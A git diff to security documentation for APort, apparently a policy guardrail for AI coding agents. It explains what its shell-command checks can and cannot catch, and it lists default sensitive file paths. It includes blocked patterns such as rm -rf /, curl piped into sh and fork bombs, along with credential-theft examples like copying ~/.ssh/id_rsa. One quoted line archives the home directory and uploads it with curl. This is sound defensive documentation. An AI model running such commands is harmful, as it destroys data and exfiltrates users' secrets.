@@ -74,6 +74,57 @@ APort is **not** a replacement for:
 
 **Why?** APort operates **within** the application layer follows the standard security model for application-layer authorization systems.
 
+### What the Bash policy does and does not see
+
+The local evaluator (`bin/aport-guardrail-bash.sh`) gets a tool name and a small context object from the host hook, nothing more. What it can enforce follows from that.
+
+| Host tool | Context forwarded | Passport limits applied |
+|-----------|-------------------|-------------------------|
+| Write, Edit, MultiEdit, NotebookEdit, single-file `apply_patch` | `file_path` | `data.file.write`: `allowed_paths`, `blocked_paths` (path prefix), `allowed_extensions` |
+| Read, and Grep with a `file_path` | `file_path` | `data.file.read`: `allowed_paths`, `blocked_patterns` (substring), `max_file_size`, plus the built-in sensitive-path list below |
+| WebFetch, WebSearch with a URL | `url` or `domain` | `web.fetch`: `allowed_domains`, `blocked_domains`, `allowed_methods` |
+| MCP tools | server and tool name | `mcp.tool.execute`: `allowed_servers`, `allowed_tools`, `allowed_tool_prefixes`, `max_timeout` |
+| Agent, Task, Skill, team and cron tools | session metadata | `agent.session.create`; the capability must be in the passport or the call is denied with `oap.unknown_capability` |
+| Bash, shell, exec tools | the command string | `system.command.execute`, described next |
+
+**Shell commands.** For `system.command.execute` the evaluator sees the command text and applies, in this order:
+
+1. Injection guard: backticks anywhere, or `$(...)` wrapping `rm`, `dd`, `mkfs`, `curl`, `wget`, `chmod`, `chown`, `sudo`, `kill`, `nc` or `netcat`, deny with `oap.command_injection_detected`.
+2. `allowed_commands`, prefix match. `"git"` allows `git status` and `git push origin main`; `"git status"` allows only that command and its arguments; `"*"` allows anything that passes the other checks.
+3. Chain guard: when `allowed_commands` is restrictive (not `*`), a command containing an unquoted `&&`, `||`, `;`, `|`, `&`, newline, `$(`, `(`, `)`, `<(`, `>(`, a `#` comment or `$'...'` / `$"..."` quoting is denied with `oap.command_chain_unsupported`. One allowed prefix cannot vouch for later segments, so the whole command is refused rather than partly authorized. Warn mode does not downgrade this code.
+4. Fixed catastrophic patterns no passport can override: `rm -rf /` and `rm -rf /*`, `dd if=/dev/`, `mkfs.`, `curl` or `wget` piped into `sh`, `bash`, `zsh`, `python` or `node`, and fork bombs.
+5. `blocked_patterns`, word-boundary and glob matching, case-insensitive. A single word such as `sudo` matches only as a whole word (it does not block `sudoku`); an entry containing `*` or `?` is a glob; a multi-word entry such as `rm -rf` matches as written.
+
+**Timeouts.** `limits["system.command.execute"].max_execution_time` (seconds) is compared with the timeout the host sends on the call. Claude Code sends `tool_input.timeout` in milliseconds and the hook converts it; other hosts send seconds. A call that carries no timeout is judged under the harness default when the harness has one and the call is bounded by it: Claude Code Bash, PowerShell and Monitor get 120 s (the 120000 ms default); Codex `shell` and `local_shell` get 10 s. Codex `exec_command` and `unified_exec` get no default because the process outlives the call. Cursor, Gemini CLI and Goose shell tools carry no timeout and are treated as unbounded. A call whose timeout key is present but malformed, or that sets `run_in_background` or `persistent`, gets no default either. With no timeout value the evaluator denies with `oap.missing_required_context`; a value above the limit is denied with `oap.timeout_exceeded`. In short: a passport that sets `max_execution_time` blocks unbounded tools. Drop the limit or use a bounded tool.
+
+**What it does not see.** The shell policy pattern-matches text. It does not model what the command does:
+
+- `git push` remotes, refspecs or branch names. `git push origin main` is a string that starts with `git push`. "No push to main" is not something the local Bash policy can enforce; use GitHub Repository Guard or a branch ruleset.
+- Files a command reads or writes. `cat .env`, `cp ~/.ssh/id_rsa /tmp/k` and `echo secret > out.txt` are never checked against `data.file.read` or `data.file.write` limits. `allowed_paths` applies to the host's Read, Write and Edit tools, not to what a shell command touches. A plain `>` redirect is not a chain operator either.
+- Network destinations. `curl https://example.com` is not checked against `web.fetch` domain limits; only the host's WebFetch and WebSearch tools are.
+- Arguments after an allowed prefix. If `curl` is in `allowed_commands`, every `curl` invocation passes unless a `blocked_patterns` entry catches it.
+
+To cover those cases, add `blocked_patterns` entries for the strings you care about (`"cat .env"`, `"git push"`, `"curl"`), or keep `allowed_commands` narrow and accept that chained commands are denied.
+
+**Recommended pairing for unattended agents.** APort covers per-tool policy and the decision log. Pair it with controls that see what the shell does:
+
+- the harness sandbox or a container for filesystem and network isolation;
+- a GitHub ruleset or branch protection on the default branch, so a `git push` that passes the string check still cannot land;
+- a scoped token for the agent (read-only or single-repo where possible) to bound blast radius;
+- APort for tool policy, the `agent.session.create` gate on subagents, and the audit trail.
+
+### Default sensitive read paths
+
+`data.file.read` denies these before consulting passport limits, matched case-insensitively against both the requested and the canonical path (`is_default_sensitive_read_path`):
+
+- `.env` and anything starting with `.env` (`.env.local`, `.envrc`)
+- the `.ssh`, `.aws`, `.gnupg` and `.kube` directories and their contents
+- `id_rsa`, `id_dsa`, `id_ecdsa`, `id_ed25519` anywhere in the path (other `id_*` names such as `id_token` are not on the list)
+- files ending in `.pem` or `.key`
+- any path containing `credentials` or `password`
+
+Not covered by default: `~/.codex/auth.json`, `~/.config/opencode/opencode.json`, `~/.netrc`, `~/.npmrc`, `~/.docker/config.json`, `~/.claude/settings.json`, and project-specific secret files. Add them to `limits["data.file.read"].blocked_patterns`; entries are substring matches, so `".codex/auth.json"` is enough. The write policy has no built-in list; block directories with `limits["data.file.write"].blocked_paths` (path-prefix match).
+
 ---
 
 ## How APort Works
@@ -117,7 +168,7 @@ APort's three-layer security model:
 - Assurance level (L0-L3: unsigned → individual → organizational → regulated)
 - Status (active, suspended, revoked)
 
-**Local mode:** Passport stored as file (`~/.openclaw/aport/passport.json`)
+**Local mode:** Passport stored as file (`<config_dir>/aport/passport.json`, for example `~/.claude/aport/passport.json` or `~/.openclaw/aport/passport.json`)
 
 **Hosted mode:** Passport fetched from APort API via agent_id
 
@@ -135,7 +186,7 @@ APort's three-layer security model:
 
 **Local Mode:**
 - Policies embedded in bash script (hand-coded for core policies)
-- Covers: system.command.execute, messaging.message.send, code.repository.merge
+- Covers: system.command.execute, data.file.read, data.file.write, web.fetch, mcp.tool.execute, agent.session.create, messaging.message.send, and a subset of code.repository.merge and code.release.publish
 - New policies require script updates
 
 **Optional: Custom policies:**
@@ -168,7 +219,7 @@ APort's three-layer security model:
 - Signature (ed25519 in API mode, "local-unsigned" in local mode)
 
 **Audit trail:**
-- Append-only log (`~/.openclaw/aport/audit.log` or centralized in API mode)
+- Append-only log (`<config_dir>/aport/audit.log` or centralized in API mode)
 - One line per decision (timestamp, tool, allow/deny, policy, code)
 - Suitable for compliance, forensics, court proceedings
 
@@ -550,7 +601,7 @@ exec.run({ command: "tar czf /tmp/data.tar.gz ~ && curl -F file=@/tmp/data.tar.g
 |--------|-----------|-----|
 | Prompt injection | ✅ APort | Hook-based enforcement, not prompt-based |
 | Malicious skill | ✅ APort | All tools checked before execution |
-| Unauthorized commands | ✅ APort | Allowlist + blocked patterns |
+| Unauthorized commands | ✅ APort | Allowlist + blocked patterns (text match on the command; see [What the Bash policy does and does not see](#what-the-bash-policy-does-and-does-not-see)) |
 | Data exfiltration | ✅ APort | File access, messaging, web requests controlled |
 | Rate limit violations | ✅ APort | Per-capability rate limits enforced |
 | Filesystem tampering | ⚠️ Local / ✅ API | Use hosted mode for production |
@@ -613,4 +664,4 @@ For more details, see:
 
 ---
 
-**Last updated:** 2026-03-01
+**Last updated:** 2026-09-23
